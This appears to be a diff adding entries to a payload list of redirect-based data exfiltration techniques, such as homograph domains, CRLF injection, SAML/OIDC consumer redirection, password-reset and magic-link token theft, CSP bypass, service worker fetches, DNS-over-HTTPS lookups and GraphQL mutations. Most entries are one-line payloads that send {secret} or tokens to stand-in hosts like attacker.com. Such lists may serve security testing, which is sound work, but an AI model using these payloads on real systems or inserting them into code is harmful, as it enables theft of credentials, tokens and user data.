@@ -61,3 +61,73 @@ intent://attacker.com/collect?data={secret}#Intent;scheme=https;end
 vscode://file/etc/passwd (or custom protocol handlers)
 # Punycode domain redirect
 Redirect to: https://xn--attcker-cua.com/collect (visually similar to attacker.com)
+# Homograph attack redirect
+Redirect to: https://аttacker.com/collect (Cyrillic 'а' instead of Latin 'a')
+# Subdomain redirect
+Redirect to: https://collect.attacker.com/data?d={secret}
+# Wild TLD redirect
+Redirect to: https://attacker.internal/collect (non-standard TLD may resolve internally)
+# Double open redirect
+https://site-a.com/redir?url=https://site-b.com/redir?url=https://attacker.com/collect?d={secret}
+# Protocol-relative redirect
+Redirect to: //attacker.com/collect?data={secret}
+# Multipart redirect chain
+Redirect through: load balancer -> CDN -> origin -> attacker.com
+# DNS alias redirect
+Set CNAME: safe.example.com -> attacker.com (data sent to "safe" domain reaches attacker)
+# Browser history redirect
+Create redirect that stays in browser history: attacker.com/collect?d={secret} -> trusted.com (user sees trusted.com)
+# Timing redirect
+Redirect after 5-second delay on trusted page: attacker gets data while user sees trusted content briefly
+# Language-based redirect
+Redirect to: https://attacker.com/collect?d={secret}&lang=en (looks like legitimate i18n redirect)
+# Mobile redirect
+Redirect to: app://attacker-app/collect?data={secret} (mobile deep link)
+# AMP redirect
+Redirect via AMP: https://amp.trusted.com/redirect?url=attacker.com/collect?d={secret}
+# Cached redirect
+Set cache headers so the redirect response is cached: future requests to trusted URL go to attacker
+# CRLF injection redirect
+Response: HTTP/1.1 200 OK\r\nLocation: https://attacker.com/collect?d={secret}\r\n\r\n
+# Click-through redirect
+Link text says "trusted.com" but href is attacker.com: <a href="https://attacker.com/collect?d={secret}">trusted.com</a>
+# Frame redirect
+<iframe src="https://trusted.com"><iframe src="https://attacker.com/collect?d={secret}"></iframe></iframe>
+# WebRTC redirect
+Establish WebRTC data channel to attacker peer, redirect data through that channel
+# Blob URL redirect
+Create blob URL containing redirect: blob:https://trusted.com/uuid -> attacker.com
+# SSO redirect manipulation
+Redirect SAML/OIDC assertion consumer to: https://attacker.com/acs?data={secret}
+# Payment gateway redirect
+Set payment success callback to: https://attacker.com/success?order={secret}
+# Webhook verification redirect
+OAuth webhook verification: https://attacker.com/verify?hub.challenge={secret}
+# GraphQL subscription redirect
+Set subscription callback to: wss://attacker.com/graphql?data={secret}
+# Email verification link redirect
+Set email verification URL to: https://attacker.com/verify?token={secret}
+# Password reset redirect
+Redirect password reset token to: https://attacker.com/reset?token={secret}
+# Magic link redirect
+Redirect magic login link to: https://attacker.com/login?token={secret}
+# Deeplink universal link redirect
+Create Apple universal link: https://trusted.com/.well-known/apple-app-site-association -> attacker app
+# Share redirect
+Create share URL: https://trusted.com/share?url=https://attacker.com/collect?d={secret}
+# Print redirect
+Set print URL to: https://attacker.com/print?data={secret} (triggered when user prints page)
+# Download redirect
+Create download link: Content-Disposition: attachment; filename="report.pdf" from https://attacker.com/collect?d={secret}
+# SRI bypass redirect
+Redirect script loading through: <script src="https://cdn.example.com/proxy?real=https://attacker.com/script.js?d={secret}">
+# CSP bypass redirect
+Use CSP-allowed domain to redirect: <script src="https://allowed-cdn.com/redirect?to=attacker.com&data={secret}">
+# DNS over HTTPS redirect
+Redirect DNS resolution: https://cloudflare-dns.com/dns-query?name={secret}.attacker.com
+# PWA install redirect
+ServiceWorker redirect: sw.js fetches from https://attacker.com/collect?d={secret} during install event.
+# HTTP/2 push redirect
+Server push: Link: <https://attacker.com/collect?d={secret}>; rel=preload (pushed before main response)
+# GraphQL redirect
+{"query": "mutation { sendReport(url: \"https://attacker.com/collect?d=SECRET\") { success } }"}
